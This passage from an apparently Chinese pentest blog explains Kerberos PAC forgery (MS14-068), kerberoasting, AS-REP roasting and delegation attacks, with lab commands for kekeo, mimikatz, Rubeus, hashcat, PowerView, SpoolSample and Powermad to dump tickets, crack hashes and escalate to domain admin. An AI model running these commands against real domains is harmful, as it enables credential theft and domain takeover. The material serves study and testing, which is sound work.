。<br>PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多</p><table><thead><tr><th>0x00000001</th><th>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</th></tr></thead><tbody><tr><td>0x00000002</td><td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td></tr><tr><td>0x00000006</td><td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td></tr><tr><td>0x00000007</td><td>KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td></tr><tr><td>0x0000000A</td><td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000B</td><td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000C</td><td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td></tr><tr><td>0x0000000D</td><td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000E</td><td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td></tr><tr><td>0x0000000F</td><td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td></tr></tbody></table><p>其中比较重要的是1,6和7</p><p><strong>0x00000001 KERBVALIDATIONINFO</strong> 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line">FILETIME LogonTime;</span><br><span class="line">FILETIME LogoffTime;</span><br><span class="line">FILETIME KickOffTime;</span><br><span class="line">FILETIME PasswordLastSet;</span><br><span class="line">FILETIME PasswordCanChange;</span><br><span class="line">FILETIME PasswordMustChange;</span><br><span class="line">RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">RPC_UNICODE_STRING FullName;</span><br><span class="line">RPC_UNICODE_STRING LogonScript;</span><br><span class="line">RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">USHORT LogonCount;</span><br><span class="line">USHORT BadPasswordCount;</span><br><span class="line">ULONG UserId; &#x2F;&#x2F;用户的sid</span><br><span class="line">ULONG PrimaryGroupId;</span><br><span class="line">ULONG GroupCount;</span><br><span class="line">[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span><br><span class="line">ULONG UserFlags;</span><br><span class="line">USER_SESSION_KEY UserSessionKey;</span><br><span class="line">RPC_UNICODE_STRING LogonServer;</span><br><span class="line">RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">PISID LogonDomainId;</span><br><span class="line">ULONG Reserved1[2];</span><br><span class="line">ULONG UserAccountControl;</span><br><span class="line">ULONG SubAuthStatus;</span><br><span class="line">FILETIME LastSuccessfulILogon;</span><br><span class="line">FILETIME LastFailedILogon;</span><br><span class="line">ULONG FailedILogonCount;</span><br><span class="line">ULONG Reserved3;</span><br><span class="line">ULONG SidCount;</span><br><span class="line">[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">PISID ResourceGroupDomainSid;</span><br><span class="line">ULONG ResourceGroupCount;</span><br><span class="line">[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure><p><strong>0x00000006和0x00000007</strong> 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。</p><h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p>这个漏洞的产生主要是微软犯下了三个错误：<br>1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的<br>2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC<br>3.下面再说</p><p>那么这个漏洞大致的攻击原理是什么呢。<br>首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID&amp;GROUP SID(在PAC的 <strong>0x00000001 KERBVALIDATIONINFO</strong> 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。</p><p>那么伪造PAC，我们就遇到了两个问题：<br>1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。<br>2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。</p><p>来说说如何绕过PAC校验和问题。<br>我们刚刚说过，<strong>0x00000006和0x00000007</strong> 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对<strong>0x00000001 KERBVALIDATIONINFO</strong>进行加密，将生成的值放入两个检验和即可，KDC拿到<strong>0x00000001 KERBVALIDATIONINFO</strong>，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改</p><p>再来说说如何绕过krbtgt hash加密TGT的问题。<br>因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。<br>这样KDC依旧会正常解析这个TGS_REQ包</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132156.png" alt="QQ截图20210217132156"></p><p>注意TGS_REQ里的include-pac依旧是false。<br><strong>然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。</strong><br>上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。</p><p>原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。</p><h3 id="M14068利用"><a href="#M14068利用" class="headerlink" title="M14068利用"></a>M14068利用</h3><p>1.工具kekeo<a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718"> https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p><p>具体方法为，在kekeo里先执行 kerberos::purge清空票据<br>然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt<br>即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png" alt="QQ截图20210217132222"></p><p>然后就dir \域控\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)</p><p>2.golenpac <a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe">https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe</a></p><p>这个工具好用,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png" alt="QQ截图20210217132233"></p><p>执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用<br>另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.<br>但返回的似乎不是域控？</p><h2 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h2><p>Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</p><h3 id="How-to-get-SPN"><a href="#How-to-get-SPN" class="headerlink" title="How to get SPN"></a>How to get SPN</h3><p>如何得到域中的所有SPN？</p><p><strong>1.setspn</strong><br>很简单，只需执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p>即可</p><p><strong>2.kerberoast工具集的GetUserSpns powershell脚本</strong></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png" alt="QQ截图20210217132445"></p><h3 id="How-to-get-HASH"><a href="#How-to-get-HASH" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p>如何得到hash？<br>有如下方法</p><p><strong>1.Rubeus.exe</strong></p><p>这个工具github上就有，但是clone下来后需要自己编译成exe.</p><p>然后执行 Rubeus.exe kerberoast指令即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png" alt="QQ截图20210217132502"></p><p><strong>2.mimikatz</strong></p><p>mimikatz真的神器。<br>通过命令 kerberos::ask /target:你所指定的SPN,</p><p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-33.png" alt="img"></p><p>即可通过认证的方式得到一个ST。<br>然后我们在kerberos::list里可以看到我们想要的ST</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png" alt="QQ截图20210217132529"></p><p><strong>3.powershell</strong></p><p>越来越发现powershell在域渗透中的重要性了<br>输入以下指令，即可完成HASH获取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot;</span><br></pre></td></tr></table></figure><p>然后mimikatz导出即可</p><h3 id="How-to-export-hash"><a href="#How-to-export-hash" class="headerlink" title="How to export hash"></a>How to export hash</h3><p>获得了ST票据，但怎么导出？</p><p><strong>1.mimikatz</strong></p><p>导出所有票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png" alt="QQ截图20210217132544"></p><p>可以发现生成了kirbi文件。这就是我们所需要的hash了</p><p><strong>2.Empire Powershell 框架</strong></p><p>github:<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><p>我们通过这个框架可以导出hashcat格式的hash.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png" alt="QQ截图20210217132627"></p><h3 id="How-to-crack-HASH"><a href="#How-to-crack-HASH" class="headerlink" title="How to crack HASH"></a>How to crack HASH</h3><p>如何破解HASH?</p><p><strong>1.HASHCAT</strong></p><p>这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13110 pass.txt hash.txt</span><br></pre></td></tr></table></figure><p><strong>2.kerberoast中的tgsrepcrack.py</strong></p><p>支持kribi文件破解</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 tgsrepcrack.py pass.txt xxx.kribi</span><br></pre></td></tr></table></figure><h3 id="How-to-use-Kerberoast"><a href="#How-to-use-Kerberoast" class="headerlink" title="How to use Kerberoast"></a>How to use Kerberoast</h3><p>既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">## 将票据权限改为administrator</span><br><span class="line">kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存</span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roast"><a href="#AS-REP-Roast" class="headerlink" title="AS_REP Roast"></a>AS_REP Roast</h2><p>较Kerberoast来说，比较鸡肋。<br>它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png" alt="QQ截图20210217132642"></p><h3 id="How-to-get-HASH-1"><a href="#How-to-get-HASH-1" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p><strong>1.Rubeus</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><p>然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png" alt="QQ截图20210217132654"></p><p><strong>2.Empire框架与 ASREPRoast.ps1</strong></p><p>使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png" alt="QQ截图20210217132707">然后用 ASREPRoast.ps1 ：<a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a> 获取指定用户的AS-REPhash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure><p>就会生成一个hash数据文件了</p><h3 id="How-to-crack-hash"><a href="#How-to-crack-hash" class="headerlink" title="How to crack hash"></a>How to crack hash</h3><p>将生成的HASH保存起来，并在下图处加入$23</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png" alt="QQ截图20210217132743"></p><p>然后丢给hashcat 跑</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.<br>原来是一个一个的用明文字典去爆破。</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><h3 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h3><p>域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。<br>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br>用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。<br>发生域委派的服务一般为机器账户和服务账户。<br>域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派</p><h4 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h4><p>非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，于是会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问所有用户权限能够访问的服务了。</p><p>非约束性委派的启用：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png" alt="QQ截图20210217134709"></p><p>为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。<br>开启后在该用户的 ACL属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个flag就在箭头所指处的后面)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png" alt="QQ截图20210217134749"></p><p>非约束委派的设置需要<code>SeEnableDelegation</code> 特权，该特权通常仅授予域管理员<br>这里说个题外话，域控主机默认是非约束性委派</p><h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4><p>非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的TGT），所以更安全的约束性委派诞生了。<br>约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。</p><p>约束性委派的大致流程：<br>用户访问开启约束性委派的服务A<br>（情况一：无S4U2SELF参与）首先需要经过KDC认证，KDC发现服务A开启了约束性委派，于是在TGS_RES返回给用户ST1（可转发ST），用户拿着ST1访问服务A，服务A先与KDC进行身份验证获得一个有效TGT，然后拿着ST1经过S4U2PROXY协议向KDC发起TGS_REQ，KDC返回ST2（用户身份的ST），然后服务A拿着ST2访问指定服务。<br>（情况二：有S4U2SELF参与）用户通过其他方式（如NTLM认证，表单认证等）获取了服务A的信任，但是此时服务A并没有来自用户的ST1，按情况一中的流程，服务A就不能完成委派。所以这个时候服务A会以自己的身份向KDC发起申请获取一个可转发TGT（获取KDC信任），然后用这个TGT发起TGS_REQ获得指定用户的ST1，既然获取了ST1，就继续情况一中的流程即可了。</p><p>也就是说S4U2SELF是用户通过非kerberos协议完成认证的情况下，自动向KDC获取ST1的一个协议。<br>而S4U2PROXY则是将ST1发给KDC，使其变现为成自己可用的 ST2 的一个协议。</p><p>启用方法:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png" alt="QQ截图20210217135048"></p><p>其中被添加的服务则是允许被委派到的服务</p><p>若启用的是 仅使用kerberos，那么useraccountcontrol属性仅有 workstation_trust_account.<br>若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png" alt="QQ截图20210217135100"></p><h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>Windows Server 2012中引入了基于资源的约束性委派。 只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控制器上配置<br>基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。<br>其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。</p><h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h3><p>非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的TGT存入lassa进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后dump出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。</p><h4 id="1-进行非约束性委派账户扫描"><a href="#1-进行非约束性委派账户扫描" class="headerlink" title="1.进行非约束性委派账户扫描"></a>1.进行非约束性委派账户扫描</h4><p>这里提一下怎么创建有SPN的服务账户。<br>只需再域控里执行 setspn -U -A spn_type username 即可<br>其中spn_type即SPN的格式： MSSQLSvc/<FQDN>:[<port> | <instancename>]</p><ul><li><strong>MSSQLSvc</strong> 是要注册的服务。</li><li><FQDN> 是服务器的完全限定域名。</li><li><port> 是 TCP 端口号。</li><li><instancename> 是 SQL Server 实例的名称。</li></ul><p>这里我们随便输一个，比如 sb/caonima 这种都行.</p><p>这里采用powersploit下的powerview.ps1<br>根据我网上很多搜索结果，查找非约束委派服务账户只需调用<br><code>Get-NetUser -Unconstrained -Domain de1ay.com</code><br>这个命令即可，但是我下载下来的powerview里的get-netuser里却没有unconstrained参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）<br>直接调用 Get-NetUser -SPN 找到所有服务账户或者Get-domaincomputer找到所有机器账户，然后判断其useraccountcontrl里有没有trusted_for_delegation,若有，则说明开启了非约束性委派</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png" alt="QQ截图20210217135123"></p><p>查询非约束委派机器账户则用<br><code>Get-domaincomputer -unconstrained -domain const.com</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png" alt="QQ截图20210217135236"></p><h4 id="2-非约束性委派的攻击"><a href="#2-非约束性委派的攻击" class="headerlink" title="2.非约束性委派的攻击"></a>2.非约束性委派的攻击</h4><p>仅能基于机器账户</p><p>如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的tgt达到任意用户访问的目的。</p><p>在被控制的非约束性委派机器上使用mimikatz。<br><code>privilege::debug</code>提权<br><code>sekurlsa::tickets</code> 查看本机所有票据</p><p>通过以上命令获取票据,如果管理员访问了本机的一些服务，那么它的TGT就会被截获放入内存。</p><p>我们模拟管理员调用非约束性委派机的smb服务</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png" alt="QQ截图20210217135342"></p><p>我们回到非约束委派机，查看票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png" alt="QQ截图20210217135358"></p><p>tgt被截获,我们用 sekurlas::tickets /export 把票据导出来</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png" alt="QQ截图20210217135408"></p><p>然后mimikatz里使用<br><code>kerberos::ptt 票据文件名 将票据注入内存</code><br>访问域控c$</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png" alt="QQ截图20210217135419"></p><p>成功</p><h4 id="3-非约束性委派配合-Spooler打印机服务"><a href="#3-非约束性委派配合-Spooler打印机服务" class="headerlink" title="3.非约束性委派配合 Spooler打印机服务"></a>3.非约束性委派配合 Spooler打印机服务</h4><p>纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。<br>但是 ：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的TGT。-<br>而且splooer服务是默认运行的。（图源WIN7）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png" alt="QQ截图20210217135445"></p><p>使其他主机强行与自己发生身份验证的脚本：需要自己编译一下<a href="https://github.com/leechristensen/SpoolSample.git">https://github.com/leechristensen/SpoolSample.git</a></p><p>在此之前需要开启监听来自其他主机的TGT，这里用的是rubeus<br><code>Rubeus.exe monitor /interval:1 /filteruser:xx</code></p><p>然后使用<code>SpoolSample.exe XX win7</code>,让指定机器访问WIN7进行身份验证</p><p>然后获得TGT，下班。</p><h3 id="约束性委派的攻击"><a href="#约束性委派的攻击" class="headerlink" title="约束性委派的攻击"></a>约束性委派的攻击</h3><p>约束性委派的大致攻击流程是: (利用S4U2SELF=&gt;)如果我们获得了约束性委派机的NTLM hash或者明文密码，我们就可以以此来向KDC发送一个TGT申请，获得一个可转发的TGT。然后用这个可转发的TGT调用S4U2SELF协议，获得一个针对自己的ST1票据（其中ST1票据中的请求用户可以任意伪造）.然后用这个ST1票据去向KDC请求ST2，然后用ST2去访问服务，此时我们访问的身份就是我们任意伪造的身份了.</p><p>重点是只要获得了可转发TGT，约束性委派机就可以任意伪造其他用户的ST1票据请求，太可怕了。</p><p>这个攻击的最大前提是我们得获得约束性委派账户的NTLM HASH或者明文密码,然后我们才能成功的得到可转发TGT，然后才能得到接下来的一切。</p><p>首先配置好约束性委派账户</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png" alt="QQ截图20210217135527"></p><p>注意选用 使用任何身份验证协议</p><p>我们先信息搜集：看哪些用户是开启约束性委派的。一手powerview安排上</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png" alt="QQ截图20210217135553"></p><p>箭头指出的地方就是可以被委派访问的服务</p><p>我们用kekeo来实现攻击.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbi这里的&#x2F;password可以改成&#x2F;NTLM:xx</span><br><span class="line">获得TGT转发票据</span><br><span class="line"></span><br><span class="line">tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DC</span><br><span class="line">tgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2</span><br></pre></td></tr></table></figure><p>把最后获得的票据用mimikatz kerberos::ptt 注入内存，完事。</p><h3 id="基于资源的约束性委派-1"><a href="#基于资源的约束性委派-1" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>refer:<a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p><h4 id="原理的几个点："><a href="#原理的几个点：" class="headerlink" title="原理的几个点："></a>原理的几个点：</h4><p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。<br>2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。<br>3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h4><p>假设开启基于资源的约束性委派机器为A<br>1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。<br>2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派<br>3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。<br>4.用ST2访问A的CIFS服务，权限获得。</p><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这个攻击说白了就是个提权…</p><p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p><p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQ截图20210217135833"></p><p>可以获得域控WIN版本</p><p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。<br>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQ截图20210217135859"></p><p>我们依旧使用powerview。先调用<br><code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID<br>然后<code>Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125;</code> 查看当前用户对某台主机是否有写权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQ截图20210217140628"></p><p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。<br>如图看到我们对WIN7进行操作</p><p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" 